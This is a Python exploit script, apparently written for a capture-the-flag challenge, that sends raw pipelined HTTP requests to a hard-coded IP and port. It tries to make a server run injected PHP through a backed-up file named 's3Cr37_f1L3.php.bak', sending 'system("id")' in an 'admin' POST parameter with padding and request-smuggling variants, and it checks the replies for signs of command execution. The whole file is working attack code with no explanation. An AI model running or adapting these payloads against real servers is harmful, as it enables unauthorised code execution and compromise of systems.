import socket
import urllib.parse
import time

host = '61.147.171.105'
port = 58039

def send_payload(name, payload_bytes):
    print(f"\n=== Testing {name} ===")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.send(payload_bytes)
        
        response = b''
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout:
                break
        sock.close()
        
        decoded = response.decode('utf-8', errors='replace')
        status_line = decoded.split('\r\n')[0]
        print(f"Status: {status_line}")
        
        if "uid=" in decoded or "www-data" in decoded or "System" in decoded or "PHP Version" in decoded or "TEST_EXEC_SUCCESS" in decoded:
            print("[!!!] POTENTIAL EXECUTION DETECTED [!!!]")
            print(decoded)
        elif "<?php" in decoded:
            print("[-] Returned source code (Not executed)")
            # print(decoded[:200])
        else:
            print("[-] No obvious output")
            print(decoded[:500])

    except Exception as e:
        print(f"Error: {e}")

cmd = 'echo "TEST_EXEC_SUCCESS"; system("id");'
post_body = 'admin=' + urllib.parse.quote(cmd)
content_len = len(post_body)

# Payload 7: POST .bak + GET nonexistent .php with Padding
# Padding might help if parser is cutting off too early
padding = "A" * 100
post_body_padded = f'admin={urllib.parse.quote(cmd)}&padding={padding}'
content_len_padded = len(post_body_padded)

p7 = (
    f'POST /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    f'Content-Type: application/x-www-form-urlencoded\r\n'
    f'Content-Length: {content_len_padded}\r\n'
    '\r\n'
    f'{post_body_padded}'
    'GET /aaaaa.php HTTP/1.1\r\n'
    '\r\n'
)

# Payload 8: POST .bak + POST nonexistent .php
p8 = (
    f'POST /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    f'Content-Type: application/x-www-form-urlencoded\r\n'
    f'Content-Length: {content_len}\r\n'
    '\r\n'
    f'{post_body}'
    'POST /aaaaa.php HTTP/1.1\r\n'
    f'Host: {host}\r\n'
    'Content-Length: 0\r\n'
    '\r\n'
)

send_payload("POST .bak + GET .php (Padded)", p7.encode())
send_payload("POST .bak + POST .php", p8.encode())

